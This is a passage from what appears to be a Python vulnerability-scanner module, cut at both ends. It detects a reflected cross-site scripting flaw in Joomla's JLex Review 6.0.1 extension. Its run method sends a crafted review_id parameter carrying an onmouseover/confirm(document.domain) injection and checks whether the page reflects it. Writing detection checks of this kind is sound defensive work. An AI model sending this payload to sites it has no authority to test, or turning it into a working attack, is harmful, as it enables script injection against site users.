...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla JLex Review 6.0.1 - Cross-Site Scripting Detection',
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'joomla', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/?review_id=1&itwed%22onmouseover=%22confirm(document.domain)%22style=%22position:absolute%3bwidth:100%25%3bheight:100%25%3btop:0%3bleft:0%3b%22b7yzn=1', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('<a href="/?itwed"onmouseover="confirm(document.domain)"style=', 'jlex-review',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Joomla JLex Review 6.0.1 - Cross-Site Scripting detected",
